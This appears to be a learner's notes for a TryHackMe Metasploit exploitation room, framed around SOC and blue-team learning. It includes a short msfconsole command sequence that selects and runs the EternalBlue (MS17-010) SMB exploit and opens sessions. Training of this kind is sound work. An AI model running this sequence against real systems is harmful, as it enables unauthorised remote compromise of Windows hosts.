# Metasploit: Exploitation

## 💻 Sample Commands / Snippets
These are **generic, legal commands** to explore vulnerability scanning and exploitation in lab environments.  
*(No lab-specific targets, payloads, or credentials included to maintain TryHackMe learning integrity.)*

```bash
# Start Metasploit Framework console
msfconsole

# Search for available exploits (generic)
search type:exploit platform:windows

# Show information about a module
info exploit/windows/smb/ms17_010_eternalblue

# Select an exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Show available payloads for the module
show payloads

# Set generic options (lab-safe)
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50

# Run the exploit in a lab environment
exploit

# Check active sessions
sessions -l

# Interact with a session
sessions -i 1
```


# Metasploit: Exploitation

## 📝 Overview
The **Metasploit: Exploitation** room introduces learners to the **Metasploit Framework** and its role in penetration testing and ethical hacking.  
Learners explore **scanning, selecting exploits, and launching payloads** in a controlled lab environment.  
Understanding exploitation techniques is crucial for **SOC analysts and blue team professionals** to recognize attack patterns, detect active exploitation, and strengthen defenses.

---

## 🎯 Learning Objectives
- Understand the purpose and structure of the **Metasploit Framework**.  
- Learn how to search and select exploits in a lab environment.  
- Explore payload options and their use cases.  
- Understand how exploitation techniques appear in logs and monitoring tools.  
- Gain foundational skills for **SOC monitoring and incident response**.  

---

## 🛠 Tools Used
- **Metasploit Framework** (`msfconsole`)  
- Virtual lab machines (**Windows/Linux**)  
- Network scanning tools (`nmap`, `netstat`)  
- Monitoring tools for SOC observation  

---

## 🔎 Key Concepts Learned
- **Exploitation Workflow:** Selecting targets, exploits, and payloads.  
- **Payloads:** Understanding different payload types (reverse shell, meterpreter).  
- **Active Monitoring:** Detecting exploitation attempts through logs and alerts.  
- **SOC Relevance:** Recognizing attack signatures and potential intrusions.  

---

## 🧠 Methodology / Approach
1. Explored the **Metasploit Framework** interface and modules.  
2. Practiced searching and selecting **lab-safe exploits**.  
3. Tested payload options and observed simulated exploit outcomes.  
4. Analyzed how these actions would appear in **logs and alerts**.  
5. Reflected on how **SOC analysts** can detect and respond to exploitation attempts.  

---

## ✅ Key Takeaways
- Familiarity with Metasploit helps **SOC analysts** recognize common exploitation techniques.  
- Understanding **payloads and exploits** enhances incident detection and response.  
- **Active monitoring and logging** are critical to detecting exploitation.  
- Safe lab practice teaches how attackers operate without compromising real systems.  

---

## 💡 Notes
- This room is highly relevant for **SOC analysts, penetration testers, and blue team professionals**.  
- Recommended to combine with **Web Application Basics, Burp Suite, and Moniker Link** for full web exploitation and monitoring context.
